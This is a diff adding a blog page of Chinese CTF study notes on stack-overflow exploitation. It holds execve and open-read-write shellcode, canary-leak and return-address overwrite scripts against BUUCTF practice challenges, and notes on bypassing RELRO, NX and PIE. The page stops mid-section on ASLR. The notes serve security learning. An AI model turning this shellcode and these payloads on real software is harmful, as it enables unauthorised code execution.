@@ -1,0 +1,389 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="description" content=嘿，我是jesse～这是我的子站，用于展示Hexo主题：MiHoYo。欢迎访问！ >
+  <meta name="keywords" content=hexo,theme,MiHoYo >
+
+  <head>
+    <title>
+       [ Hexo ]
+    </title>
+  <meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+
+    <link rel="stylesheet" href="/css/header.css">
+<div class="header">
+  <div class="logo">
+    <span class="pull-left">
+      <a id="site-name" href="/">
+        jesse&#39;s blog
+      </a>
+    </span>
+  </div>
+  <ul class="nav-list">
+    
+      <li>
+        <a href="/">
+          首页
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          关于
+        </a>
+      </li>
+      
+  </ul>
+</div>
+
+      <!--<link rel="stylesheet" href="/css/top-header.css">
+<div id="top-bar" class="fixed">
+
+  <a class="goto-top" href="#"></a>
+  <ul class="bar-list bar-list-1">
+    
+      <li>
+        <p>
+          <a href="/">
+            <text class="bar-text bar-p1">
+              首页
+            </text>
+            <text class="bar-text bar-p2"></text>
+          </a>
+          <text class="bar-p3">/</text>
+        </p>
+      </li>
+      
+      <li>
+        <p>
+          <a href="/about">
+            <text class="bar-text bar-p1">
+              关于
+            </text>
+            <text class="bar-text bar-p2"></text>
+          </a>
+          <text class="bar-p3">/</text>
+        </p>
+      </li>
+      
+  </ul>
+</div>-->
+
+        <div id="content-outer">
+          <div class="content-inner">
+            <link rel="stylesheet" href="/css/post.css">
+<div class="posts">
+  <a href="/index.html"><i class="fa fa-home
+replay-btn" aria-hidden="true"></i></a>
+  <div class="post-title">
+    <p>
+      
+    </p>
+    <hr>
+  </div>
+  <div class="post-content">
+    <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>栈作为一种数据结构，是一种只能在<strong>一端</strong>进行插入和删除操作的特殊线性表，高地址在下，低地址在上，它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后进入的数据在栈顶，需要读数据的时候从栈顶开始弹出数据。</p>
+<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><strong>1.push</strong>：将数据<strong>压入栈顶</strong>，同时ESP-4（32位）或RSP-8（64位）</p>
+<p><strong>2.pop</strong>：将栈顶数据<strong>弹出</strong>，同时ESP+4（32位）或RSP+8（64位)</p>
+<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><strong>1.ESP</strong>：栈顶指针，指向<strong>栈顶</strong>的低地址</p>
+<p><strong>2.EBP</strong>：栈底指针，指向<strong>栈底</strong>的高地址</p>
+<h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出是指程序向<strong>栈中</strong>某个变量中写入的字节数<strong>超过</strong>了这个变量本身所申请的字节数。</p>
+<p>![](F:\er jin zhi\pwn\企业微信截图_17203377649750.png)</p>
+<h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><p>1.基础脚本</p>
+<p><strong>2是本地，3是远程</strong></p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240707173158.jpg)</p>
+<p>2.基本命令</p>
+<p>cyclic +数字 会随机产生相应长度的字符串</p>
+<p>p+函数名 获得该函数地址</p>
+<p>gdb +文件名 对该文件进行调试</p>
+<p>r&#x2F;start  运行程序</p>
+<p>c  运行至断点&#x2F;输入处</p>
+<p>n&#x2F;ni 单步步入</p>
+<p>cyclic -l +报错地址 可以得到偏移量</p>
+<p>ROPgadget –binary filename –only ‘pop|ret’ |grep ‘搜索字符串’  可以搜素字符串的地址</p>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15845766.html">https://www.cnblogs.com/ZIKH26/articles/15845766.html</a></p>
+<p>概念:shellcode是指一段用于完成某个功能的代码,常见的功能主要是获取目标系统的shell.</p>
+<p>特点:短小精悍,通常为16进制机器码,可以重复利用</p>
+<h4 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a><strong>shellcode的编写</strong></h4><p>1.<strong>32位</strong>系统编写:通过特定的汇编代码把特定的寄存器设置为特定的值之后,再调用int 80h,执行系统函数sys_execve(后门函数)(“&#x2F;bin&#x2F;sh”,NULL,NULL)就可以获得系统shell.</p>
+<ul>
+<li>将EAX寄存器的值设置为0Xb: EAX&#x3D;0Xb</li>
+<li>将EBX寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:EBX&#x3D;&amp;(“&#x2F;bin&#x2F;sh\x00”)</li>
+<li>将ECX和EDX寄存器的值都设为0:ECX&#x3D;EDX&#x3D;0</li>
+</ul>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240708150843.jpg)</p>
+<p><strong>asm -r +”32位shellcode”</strong></p>
+<p>2.<strong>64位</strong>系统编写:原理同32位,不过调用的是<strong>syscall</strong></p>
+<p><strong>64位程序当中传递参数不是直接通过栈,而是前6个参数通过寄存器,分别是RDI,RSI,RDX,RCX,R8,R9,第6个参数之后的参数才是通过栈传递的</strong></p>
+<ul>
+<li>将RAX寄存器的值设置为0X3b:RAX&#x3D;0X3b</li>
+<li>将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI&#x3D;&amp;(“&#x2F;bin&#x2F;sh”)</li>
+<li>将RSI和RDX寄存器的值都设为0:RSI&#x3D;RDX&#x3D;0</li>
+</ul>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240708152126.jpg)</p>
+<p>可以通过pwntools的shellcraft模块来产生合适的shellcode:<strong>shellcraft.sh()</strong></p>
+<p>默认产生的是32位的shellcode,如果要产生64位的shellcode需要先声明系统版本:context(os&#x3D;’linux’,arch&#x3D;’amd64’)</p>
+<h4 id="shellcode示例脚本"><a href="#shellcode示例脚本" class="headerlink" title="shellcode示例脚本"></a><strong>shellcode示例脚本</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="手写open-read-write的shellcode"><a href="#手写open-read-write的shellcode" class="headerlink" title="手写open,read,write的shellcode"></a>手写open,read,write的shellcode</h4><p><strong>使用场景</strong>:遇见pwn题开启了沙箱保护的话,如果禁用了execve,system函数.但没有开启NX保护的话,可以采用orw的方式来读出flag.</p>
+<p>1.64位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">push <span class="number">0x67616c66</span></span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line"><span class="comment">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span></span><br><span class="line"><span class="comment">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span></span><br><span class="line"><span class="comment">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span></span><br><span class="line"><span class="comment">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">pop rsi</span><br><span class="line">push <span class="number">2</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">push <span class="number">3</span></span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line"><span class="comment">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span></span><br><span class="line"><span class="comment">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span></span><br><span class="line"><span class="comment">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span></span><br><span class="line"><span class="comment">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span></span><br><span class="line">push <span class="number">0x50</span></span><br><span class="line">pop rdx</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line"><span class="comment">#这个地方的push rsp pop rsi原理同上</span></span><br><span class="line">push <span class="number">0x50</span></span><br><span class="line">pop rdx</span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>2.32位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0x67616c66</span></span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push <span class="number">5</span></span><br><span class="line">pop eax</span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push <span class="number">0x50</span></span><br><span class="line">pop edx</span><br><span class="line">push <span class="number">3</span></span><br><span class="line">pop eax</span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push <span class="number">0x50</span></span><br><span class="line">pop edx</span><br><span class="line">push <span class="number">4</span></span><br><span class="line">pop eax</span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>32位和64位编写的区别</strong>:主要是<strong>寄存器不同和系统调用号不同</strong>，另外就是<strong>在压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（64位不需要push 0的原因是存入的’flag’不足8字节，会自动添加00来截断）</p>
+<h4 id="调试和测试shellcode"><a href="#调试和测试shellcode" class="headerlink" title="调试和测试shellcode"></a>调试和测试shellcode</h4><p>将汇编代码编译为可执行文件,用gdb调试</p>
+<p><strong>先用touch shellcode.asm命令创建一个shellcode.asm文件(asm文件是使用汇编语言编写的源代码文件),然后用vim shellcode.asm去编辑这个文件,将汇编的内容写入这个文件里面.</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.section.text</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>linux汇编.section .text .data 与.global的认识&#x2F;作用</p>
+<p><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-20548989-id-1667484.html">http://blog.chinaunix.net/uid-20548989-id-1667484.html</a></p>
+<p>然后用<strong>nasm -f elf64 shellcode.asm</strong>这个命令去编译刚才写的那个文件（会生成一个.o文件）</p>
+<p>然后可以用 <strong>objdump -d shellcode.o</strong> （直接查看的话，是看的AT&amp;T语法的汇编，如果想看intel语法的话加上**-M intel**参数即可</p>
+<p>不过由于目前生成的仅仅是.o文件，没有被链接过，还无法执行或者调试。因此我们需要<strong>链接</strong>一下。</p>
+<p>输入命令<strong>ld -s -o shellcode shellcode.o</strong> 即可,<strong>执行</strong>成功</p>
+<p>如果想<strong>调试</strong>的话，<strong>直接gdb挂上，然后start</strong>就可以开始调试我们写的shellcode.</p>
+<h2 id="栈溢出保护机制及绕过方式"><a href="#栈溢出保护机制及绕过方式" class="headerlink" title="栈溢出保护机制及绕过方式"></a>栈溢出保护机制及绕过方式</h2><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>RELRO有<strong>Partial RELRO</strong>和<strong>FULL RELRO</strong>两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。在Linux下默认开启状态。</p>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>ROP绕过</p>
+<h3 id="Stack-CANARY"><a href="#Stack-CANARY" class="headerlink" title="Stack(CANARY)"></a>Stack(CANARY)</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RChaos/article/details/105147321">https://blog.csdn.net/RChaos/article/details/105147321</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262846#h2-1">https://www.anquanke.com/post/id/262846#h2-1</a></p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240716154622.jpg)</p>
+<p>Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。如果<strong>栈中开启Canary found</strong>，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要<strong>通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。</strong></p>
+<p><strong>泄露栈中canary的思路是1.覆盖canary的低字节\x00，然后连同用户的字符串和剩余的canary部分一起打印出来.2.爆破Canary,见绕过方式2</strong></p>
+<p>泄露条件：</p>
+<ul>
+<li>存在栈溢出漏洞</li>
+<li>可以将存在于栈上的可控变量进行输出</li>
+</ul>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>canary单词本意是“金丝雀”，我的理解这里将该词引申为“<strong>标记位置</strong>”.canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。</p>
+<p>Canary设计为以字节\x00结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印,当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了</p>
+<p>函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。<strong>攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</strong>在Linux中我们将cookie信息称为canary。通常是一个低字节\x00的16进制数</p>
+<h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><p> 通过改写指针与局部变量、<code>leak canary</code>、<code>overwrite canary</code>的方法来绕过。</p>
+<ul>
+<li><p>格式化字符串泄露打印canary，然后通过计算offset构造ROP</p>
+</li>
+<li><p>若存在fork()函数，当程序进入到子进程的时候，其canary的值和父进程中canary的值一样，可以通过栈溢出覆盖逐位爆破canary.(32位的程序需爆破3个字节,64位程序需爆破7个字节,每个字节有256种可能)</p>
+</li>
+<li><p><code>SSP Leak(Stack Smashing Protect Leak )</code>，利用这种方法获取到内存中的值</p>
+</li>
+<li><p>劫持<code>stack_chk_fail</code>函数,<code>stack_chk_fail</code>函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改GOT表中的值。通过格式化字符串漏洞来篡改GOT表中<code>stack_chk_fail</code>存储的地址，将它的地址修改成system(“&#x2F;bin&#x2F;sh”)函数地址，然后通过栈溢出来覆盖canary，故意触发<code>__stack_chk_fail</code>函数的执行，相当于执行了system(“&#x2F;bin&#x2F;sh”)函数，从而<code>getshell</code></p>
+</li>
+<li><p>覆盖TLS中储存在TLS中,在函数返回前会使用这个值进行对比,当溢出尺寸较大时,可以同时覆盖栈上储存的Canary和TLS储存的Canary实现绕过</p>
+<hr>
+</li>
+</ul>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ww_r66KqMTxQyGzdcLphOQ">https://pan.baidu.com/s/1ww_r66KqMTxQyGzdcLphOQ</a><br>提取码：qtor</p>
+<p><strong>WP</strong></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1721120639303.png"></p>
+<p>![](F:\er jin zhi\pwn\笔记截图\20200329225539162.png)</p>
+<p>首先我们计算一下buf到cananry的距离</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\20200330213043657.png)</p>
+<p>这三个定义的变量中，buf和i的作用是知道的，那么v3就是存储canary的位置，v3的相对位置为esp+0x6c的位置，buf是esp+0x8的位置，所以buf到canary的字节大小为0x6c-0x8&#x3D;0x64&#x3D;100，也可以用ebp相对位置算，结果相同，说明buf需要填充的字节大小为100。</p>
+<p><img src="C:\Users\30451\AppData\Local\Temp\1721121210910.png" alt="72112121091"></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1721121228511.png"></p>
+<p>canary  word的数据形式为0x******00，因为是小端存储，所以在内存最开始的位置存储的是\x00。Canary的值最后两位是0,也就是说是一个字符的大小,如果上面是字符串,写多了一位,刚好把这个00覆盖掉，那么,就能打印出前几位Canary的值.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + <span class="string">&#x27;b&#x27;</span>选择用b来覆盖<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
+
+<p>这就是我们recv到的字符串，所以我们需要优化一下recv（），而且后面出现的cananry是乱码的状态，需要用u32（）解开</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\20200330215610688.png)</p>
+<p>\x00是填充字符，不影响数据本身，只是为了凑够4个字节的填充物<br>0xf7f242，完整的应该是0xf7f24200，少了个00，说明这正是我们覆盖过的cananry<br>很重要的一点！！！是send不是sendline，sendline会多发送一个‘\n’，如果你使用sendline，那么请不要多发送那个b，这个\n就会覆盖cananry的\x00.</p>
+<p>现在我们已经获得了cananry word了，我们已经写到了cannary的位置，然后我们需要获得canary到ebp的大小，v3的变量已经写了，ebp-0xc，所以是12</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line"><span class="comment">#get_shell = 0x0804859B</span></span><br><span class="line">get_shell = <span class="number">0x11E9</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello Hacker!\n&quot;</span>)</span><br><span class="line">offset = <span class="number">0x70</span>-<span class="number">0xC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(offset) + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;ab&quot;</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>).rjust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload2 =<span class="string">b&#x27;a&#x27;</span>*(offset) + p32(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">12</span> + p32(get_shell)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<h4 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>ROP绕过</p>
+<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>1.BUUCTF  ciscn_2019_n_1</p>
+<p><strong>wp</strong></p>
+<p>查看保护情况，开启NX保护（不可执行shellcode），动态链接</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 193444.png)</p>
+<p>ida分析</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194238.png)</p>
+<p>双击v1和v2，查看变量地址，可以看到两个参数直接的距离是-0x4-（-0x30）&#x3D;0x2c，<strong>就是说我们写入v1数据时候时候在写入0x2c个字节之后在写入11.28125，这样就可以让v2&#x3D;11.28125了</strong></p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194443.png)</p>
+<p>细心点的话可以发现程序里面也有11.28125的在内存中16进制的表示</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194637.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25169</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x41348000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2.BUUCTF pwn1_sctf_2016_1</p>
+<p><strong>wp</strong></p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195730.png)ida分析，shift+F12查看字符串，发现敏感字符串cat flag.txt</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195524.png)</p>
+<p>F5反编译，进入伪代码，记下函数地址0x8048F0D</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195947.png)</p>
+<p>进入main函数，分析，s的地址距离返回地址为0x3c+4，从转换开始一个I可以转换成三个字节来算，需要21个I和一个随机的字符即可到达，之后返回到cat flag的位置。</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\7a09bc2dc8a7293d6eb42008fea3b5cf.png)</p>
+<p>可以看到第13行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，<strong>小于0x3c</strong>，没有办法造成溢出，但是这个程序有点意思的地方就在于将一个字节的“I”替换成三个字节的“you”<br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27975</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x8048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;aaaa&#x27;</span>+p32(flag_addr)</span><br><span class="line"><span class="comment">#payload = b&#x27;I&#x27;*21+b&#x27;a&#x27;+p32(flag_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Junglezt/p/18253924">https://www.cnblogs.com/Junglezt/p/18253924</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYwf=QQcP0Id3x#toc-2">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYwf%3DQQcP0Id3x#toc-2</a></p>
+<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>ASLR（Address Space Layout Randomization）：<strong>地址随机化</strong>，<strong>通常用来防御ret2libc攻击</strong>，有以下3种配置：</p>
+<p> 0 - 表示关闭进程地址空间随机化。</p>
+<p> 1 - 表示将mmap的基址，stack和vdso页面随机化。</p>
